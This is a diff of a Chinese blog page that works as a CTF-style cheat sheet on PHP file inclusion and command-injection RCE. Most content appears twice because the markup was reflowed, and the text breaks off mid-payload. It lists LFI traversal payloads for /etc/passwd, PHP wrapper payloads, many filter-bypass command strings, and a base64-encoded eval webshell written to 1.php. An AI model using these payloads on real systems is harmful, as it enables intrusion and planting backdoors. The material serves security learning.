@@ -284,7 +284,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.9k 字
+          9.8k 字
         
       </span>
     
@@ -295,7 +295,7 @@
         
         
         
-          42 分钟
+          41 分钟
         
       </span>
     
@@ -358,144 +358,230 @@
             
               <div class="markdown-body">
                 
-                <h1 id="文件包含与RCE"><a href="#文件包含与RCE" class="headerlink" title="文件包含与RCE"></a>文件包含与RCE</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PHP：<span class="hljs-built_in">include</span>()，<span class="hljs-built_in">include_once</span>()，<span class="hljs-built_in">require</span>()，<span class="hljs-built_in">require_once</span>()，<span class="hljs-built_in">fopen</span>()，<span class="hljs-built_in">readfile</span>() 等<br>JSP Servlet：ava<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>()，java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>() 等<br>ASP：includefile，includevirtual 等<br></code></pre></td></tr></table></figure>
-
-<p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件是什么类型。</p>
-<h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><h4 id="1-00-截断"><a href="#1-00-截断" class="headerlink" title="[1]%00 截断"></a>[1]%00 截断</h4><p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。 <code>?file=../../../../../../../../../etc/passwd%00</code></p>
-<h4 id="2-路径长度截断"><a href="#2-路径长度截断" class="headerlink" title="[2]路径长度截断"></a>[2]路径长度截断</h4><p>Linux 需要文件名长于 4096，Windows 需要长于 256。 <code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></p>
-<h4 id="3-点号截断"><a href="#3-点号截断" class="headerlink" title="[3]点号截断"></a>[3]点号截断</h4><p>只适用 Windows，点号需要长于 256。 <code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
-<h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>条件<br><code>allow_url_include = on</code></p>
+                <h1 id="文件包含与rce">文件包含与RCE</h1>
+<h2 id="文件包含">文件包含</h2>
+<h3 id="文件包含常见函数">文件包含常见函数</h3>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PHP：<span class="hljs-built_in">include</span>()，<span class="hljs-built_in">include_once</span>()，<span class="hljs-built_in">require</span>()，<span class="hljs-built_in">require_once</span>()，<span class="hljs-built_in">fopen</span>()，<span class="hljs-built_in">readfile</span>() 等<br>JSP Servlet：ava<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>()，java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>() 等<br>ASP：includefile，includevirtual 等<br></code></pre></td></tr></table></figure>
+<p>当 PHP 包含一个文件时，会将该文件当做 PHP
+代码执行，而不会在意文件是什么类型。</p>
+<h3 id="本地文件包含lfi">本地文件包含(LFI)</h3>
+<h4 id="截断">[1]%00 截断</h4>
+<p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。
+<code>?file=../../../../../../../../../etc/passwd%00</code></p>
+<h4 id="路径长度截断">[2]路径长度截断</h4>
+<p>Linux 需要文件名长于 4096，Windows 需要长于 256。
+<code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></p>
+<h4 id="点号截断">[3]点号截断</h4>
+<p>只适用 Windows，点号需要长于 256。
+<code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
+<h3 id="远程文件包含rfi">远程文件包含(RFI)</h3>
+<p>条件 <code>allow_url_include = on</code></p>
 <p>实质上和LFI一样，只是能够包含远程的文件</p>
 <p>用得比较多的协议有<code>php://input</code></p>
-<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p>
-<p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的就可以执行命令命令<br>遇到<code>file_get_contents()</code>要联想到<code>php://input</code>绕过</p>
-<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>);        <span class="hljs-comment">#文件读取</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);   <span class="hljs-comment">#文件写入</span><br><span class="hljs-meta">?&gt;</span><br><br>payload:<br><br>?file1=php:<span class="hljs-comment">//filter/resource=flag.php                             #明文读取</span><br>?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php  #编码读取</span><br> <br>?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=test                             #明文写入</span><br>?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=test #编码写入</span><br></code></pre></td></tr></table></figure>
-
-<p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code> </p>
-<p>常见编码有两种方式：<code>base64</code>&#x2F;rot-13编码，两种过滤器分别为： <code>base64：convert.base64-encode</code> <code>rot-13：string.rot13</code><br>扩展（绕过方式）：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a><br><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p>
-<h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=On</code> </p>
-<p>类似php:&#x2F;&#x2F;input，用户控制输入流<br><code>data://text/plain;base64,Y2F0IC9mbGFn</code><br><code>data:text/plain;base64,Y2F0IC9mbGFn</code></p>
-<h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p>
-<p>zip:&#x2F;&#x2F;可以访问压缩包里面的文件，当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行，从而实现任意代码执⾏。只需要是zip的压缩即可，后缀名可以任意更改<br><code>zip:///tmp/file.zip%23flag.txt</code></p>
-<h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>利用条件：<br> <code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p>
+<h3 id="伪协议">伪协议</h3>
+<h4 id="phpinput">php://input</h4>
+<p>利用条件： <code>allow_url_include=On</code>
+<code>allow_url_fopen=Off/On</code></p>
+<p>php://input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的就可以执行命令命令
+遇到<code>file_get_contents()</code>要联想到<code>php://input</code>绕过</p>
+<h4 id="phpfilter">php://filter</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>);        <span class="hljs-comment">#文件读取</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);   <span class="hljs-comment">#文件写入</span><br><span class="hljs-meta">?&gt;</span><br><br>payload:<br><br>?file1=php:<span class="hljs-comment">//filter/resource=flag.php                             #明文读取</span><br>?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php  #编码读取</span><br> <br>?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=test                             #明文写入</span><br>?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=test #编码写入</span><br></code></pre></td></tr></table></figure>
+<p>利用条件： <code>allow_url_include=On</code>
+<code>allow_url_fopen=Off/On</code></p>
+<p>常见编码有两种方式：<code>base64</code>/rot-13编码，两种过滤器分别为：
+<code>base64：convert.base64-encode</code>
+<code>rot-13：string.rot13</code> 扩展（绕过方式）：
+https://blog.csdn.net/woshilnp/article/details/117266628
+https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</p>
+<h4 id="data">data://</h4>
+<p>利用条件： <code>allow_url_include=On</code>
+<code>allow_url_fopen=On</code></p>
+<p>类似php://input，用户控制输入流
+<code>data://text/plain;base64,Y2F0IC9mbGFn</code>
+<code>data:text/plain;base64,Y2F0IC9mbGFn</code></p>
+<h4 id="zip">zip://</h4>
+<p>利用条件： <code>allow_url_include=On</code>
+<code>allow_url_fopen=Off/On</code></p>
+<p>zip://可以访问压缩包里面的文件，当它与包含函数结合时，zip://流会被当作php文件执行，从而实现任意代码执⾏。只需要是zip的压缩即可，后缀名可以任意更改
+<code>zip:///tmp/file.zip%23flag.txt</code></p>
+<h4 id="phar">phar://</h4>
+<p>利用条件： <code>allow_url_include=On</code>
+<code>allow_url_fopen=Off/On</code></p>
 <p>php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，与zip协议有些相似</p>
-<h4 id="netdoc"><a href="#netdoc" class="headerlink" title="netdoc:&#x2F;&#x2F;"></a>netdoc:&#x2F;&#x2F;</h4><p>在java中可以利用netdoc协议读取文件，可以简单认为部分代替了file协议，多用于ssrf</p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE英文全称：remote command&#x2F;code execute（远程命令&#x2F;代码执行漏洞） 漏洞出现的原因：没有在输入口做输入处理。 我们常见的路由器、防火墙、入侵检测等设备的web管理界面上可能会提供给用户一个命令操作的web界面&#x2F;接口，如果此接口未做过滤&#x2F;有漏洞，攻击者有可能直接向服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p>
-<h3 id="危险函数："><a href="#危险函数：" class="headerlink" title="危险函数："></a>危险函数：</h3><p>php：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>exec()</code><br>asp：<code>eval()</code><br>perl：<code>exec</code>、<code>system</code>、<code>qx//</code><br>python：<code>os.system()</code><br>go：<code>exec.Command()</code></p>
-<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Bash">more:        一页一页的显示档案内容<br>less:        与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:        从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:        查看尾几行<br><span class="hljs-built_in">nl</span>:                显示内容，顺便输出行号<br><span class="hljs-built_in">od</span>:                以二进制的方式读取档案内容<br>vi:                一种编辑器，这个也可以查看<br>vim:        一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:        文件排序并输出也可以查看内容<br><span class="hljs-built_in">uniq</span>:        可以查看 file -f:报错出具体内容 grep<br>strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br><span class="hljs-built_in">paste</span>        把每个文件以列对列的方式，一列列地加以合并<br>grep        grep &#123; flag.php打印有”&#123;“的一行<br>sed                一种编辑器，可以用sed -f flag.php读取flag<br>rev          读取倒叙的文件内容<br></code></pre></td></tr></table></figure>
-
-<h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>使用<code>/**/</code>、<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20</code>、<code>%09</code>、<code>$IFS$9</code>、<code>$&#123;IFS&#125;</code>、<code>IFS</code>、<code>$IFS$1</code>等</p>
-<h4 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符 &#x2F;"></a>过滤分隔符 &#x2F;</h4><p>利用<code>;</code>执行多条命令</p>
+<h4 id="netdoc">netdoc://</h4>
+<p>在java中可以利用netdoc协议读取文件，可以简单认为部分代替了file协议，多用于ssrf</p>
+<h2 id="rce">RCE</h2>
+<p>RCE英文全称：remote command/code execute（远程命令/代码执行漏洞）
+漏洞出现的原因：没有在输入口做输入处理。
+我们常见的路由器、防火墙、入侵检测等设备的web管理界面上可能会提供给用户一个命令操作的web界面/接口，如果此接口未做过滤/有漏洞，攻击者有可能直接向服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p>
+<h3 id="危险函数">危险函数：</h3>
+<p>php：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>exec()</code>
+asp：<code>eval()</code>
+perl：<code>exec</code>、<code>system</code>、<code>qx//</code>
+python：<code>os.system()</code> go：<code>exec.Command()</code></p>
+<h3 id="绕过方式">绕过方式</h3>
+<h4 id="过滤cat">过滤cat</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Bash">more:        一页一页的显示档案内容<br>less:        与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:        从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:        查看尾几行<br><span class="hljs-built_in">nl</span>:                显示内容，顺便输出行号<br><span class="hljs-built_in">od</span>:                以二进制的方式读取档案内容<br>vi:                一种编辑器，这个也可以查看<br>vim:        一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:        文件排序并输出也可以查看内容<br><span class="hljs-built_in">uniq</span>:        可以查看 file -f:报错出具体内容 grep<br>strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br><span class="hljs-built_in">paste</span>        把每个文件以列对列的方式，一列列地加以合并<br>grep        grep &#123; flag.php打印有”&#123;“的一行<br>sed                一种编辑器，可以用sed -f flag.php读取flag<br>rev          读取倒叙的文件内容<br></code></pre></td></tr></table></figure>
+<h4 id="过滤空格">过滤空格</h4>
+<p>使用<code>/**/</code>、<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20</code>、<code>%09</code>、<code>$IFS$9</code>、<code>$&#123;IFS&#125;</code>、<code>IFS</code>、<code>$IFS$1</code>等</p>
+<h4 id="过滤分隔符">过滤分隔符 /</h4>
+<p>利用<code>;</code>执行多条命令</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cd</span> xx;<span class="hljs-built_in">ls</span> -al</span><br></code></pre></td></tr></table></figure>
-
-<h4 id="过滤运算符-和"><a href="#过滤运算符-和" class="headerlink" title="过滤运算符|和&amp;"></a>过滤运算符|和&amp;</h4><p>使用<code>;</code>或 <code>%0a</code></p>
-<h4 id="过滤flag、php等字符"><a href="#过滤flag、php等字符" class="headerlink" title="过滤flag、php等字符"></a>过滤flag、php等字符</h4><h5 id="拼接字符串绕过"><a href="#拼接字符串绕过" class="headerlink" title="拼接字符串绕过"></a>拼接字符串绕过</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=m=p%0an=hp%0acat$&#123;IFS&#125;flag.$m$n<br></code></pre></td></tr></table></figure>
-
-<h5 id="ls-i"><a href="#ls-i" class="headerlink" title="ls -i"></a>ls -i</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -i + <span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure>
-
+<h4 id="过滤运算符和">过滤运算符|和&amp;</h4>
+<p>使用<code>;</code>或 <code>%0a</code></p>
+<h4 id="过滤flagphp等字符">过滤flag、php等字符</h4>
+<h5 id="拼接字符串绕过">拼接字符串绕过</h5>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=m=p%0an=hp%0acat$&#123;IFS&#125;flag.$m$n<br></code></pre></td></tr></table></figure>
+<h5 id="ls--i">ls -i</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -i + <span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure>
 <p>组合拳</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">ls</span> -i   <span class="hljs-comment">#找出文件pid</span><br><span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`   <span class="hljs-comment">#find / -inum id返回此id对应的文件名（路径）</span><br></code></pre></td></tr></table></figure>
-
-<h5 id="输出到另一个文件"><a href="#输出到另一个文件" class="headerlink" title="输出到另一个文件"></a>输出到另一个文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">printf</span> /fla &gt; /tmp/hello %26%26 <span class="hljs-built_in">printf</span> g &gt;&gt; /tmp/hello %26%26 <span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello`<br><span class="hljs-comment">#printf /fla &gt; /tmp/hello ----&gt; 将 /fla 写入/tmp/hello文件</span><br><span class="hljs-comment">#printf g &gt;&gt; /tmp/hello ----&gt; 将 g 追加写入/tmp/hello文件。目前/tmp/hello文件中的内容就是：/flag</span><br><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello` ----&gt; `<span class="hljs-built_in">cat</span> /tmp/hello` 会输入出 /flag，<span class="hljs-built_in">cat</span> 会读取 /flag ，即可得到flag。<br></code></pre></td></tr></table></figure>
-
-<h5 id="编码绕过-写入文件"><a href="#编码绕过-写入文件" class="headerlink" title="编码绕过(写入文件)"></a>编码绕过(写入文件)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | <span class="hljs-built_in">base64</span> -d 1.php<br></code></pre></td></tr></table></figure>
-
-<h5 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t fl<span class="hljs-string">&#x27;&#x27;</span>ag 或ca<span class="hljs-string">&quot;&quot;</span>t fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure>
-
-<h5 id="shell变量绕过"><a href="#shell变量绕过" class="headerlink" title="shell变量绕过"></a>shell变量绕过</h5><p> <code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p>
-<h5 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t f\lag<br></code></pre></td></tr></table></figure>
-
-<h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f*<br><span class="hljs-built_in">cat</span> fla?<br></code></pre></td></tr></table></figure>
-
-<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号{}</h5><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 <code>&#123;cat,flag&#125;</code></p>
-<h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure>
-
+<h5 id="输出到另一个文件">输出到另一个文件</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">printf</span> /fla &gt; /tmp/hello %26%26 <span class="hljs-built_in">printf</span> g &gt;&gt; /tmp/hello %26%26 <span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello`<br><span class="hljs-comment">#printf /fla &gt; /tmp/hello ----&gt; 将 /fla 写入/tmp/hello文件</span><br><span class="hljs-comment">#printf g &gt;&gt; /tmp/hello ----&gt; 将 g 追加写入/tmp/hello文件。目前/tmp/hello文件中的内容就是：/flag</span><br><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello` ----&gt; `<span class="hljs-built_in">cat</span> /tmp/hello` 会输入出 /flag，<span class="hljs-built_in">cat</span> 会读取 /flag ，即可得到flag。<br></code></pre></td></tr></table></figure>
+<h5 id="编码绕过写入文件">编码绕过(写入文件)</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | <span class="hljs-built_in">base64</span> -d 1.php<br></code></pre></td></tr></table></figure>
+<h5 id="单双引号绕过">单双引号绕过</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t fl<span class="hljs-string">&#x27;&#x27;</span>ag 或ca<span class="hljs-string">&quot;&quot;</span>t fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure>
+<h5 id="shell变量绕过">shell变量绕过</h5>
+<p><code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p>
+<h5 id="反斜杠绕过">反斜杠绕过</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t f\lag<br></code></pre></td></tr></table></figure>
+<h5 id="通配符绕过">通配符绕过</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f*<br><span class="hljs-built_in">cat</span> fla?<br></code></pre></td></tr></table></figure>
+<h4 id="其他">其他</h4>
+<h5 id="花括号">花括号</h5>
+<p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令
+<code>&#123;cat,flag&#125;</code></p>
+<h5 id="反引号">反引号</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure>
 <p>相当于cat目录下所有文件</p>
-<h5 id="非法变量"><a href="#非法变量" class="headerlink" title="非法变量"></a>非法变量</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p>
+<h5 id="非法变量">非法变量</h5>
+<p>https://blog.csdn.net/mochu7777777/article/details/115050295</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a_b.&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure>
-
 <p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
-<p>传参 <code>?a[b.=system(&quot;ls&quot;);</code></p>
-<h5 id="一些组合拳payload"><a href="#一些组合拳payload" class="headerlink" title="一些组合拳payload"></a>一些组合拳payload</h5><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">tac&lt;/fla\g.php||<br>awk%<span class="hljs-number">09</span><span class="hljs-string">&#x27;/f/&#123;print&#125;&#x27;</span>%<span class="hljs-number">09</span>/fla?||<br>uniq<span class="hljs-string">$&#123;</span><span class="hljs-type">IFS</span>&#125;/f???<br>/???/????<span class="hljs-number">64</span> /????<br>uniq `expr substr <span class="hljs-string">$P</span>ATH <span class="hljs-number">11</span>`f*<br>od -c <span class="hljs-string">$&#123;</span><span class="hljs-type">OLDPWD</span>&#125;flag<br>cat <span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-number">0</span>:<span class="hljs-number">1</span>&#125;f*<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#LESS</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-type">SHLVL</span>&#125;&#125;   <span class="hljs-symbol">#ls</span><br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span 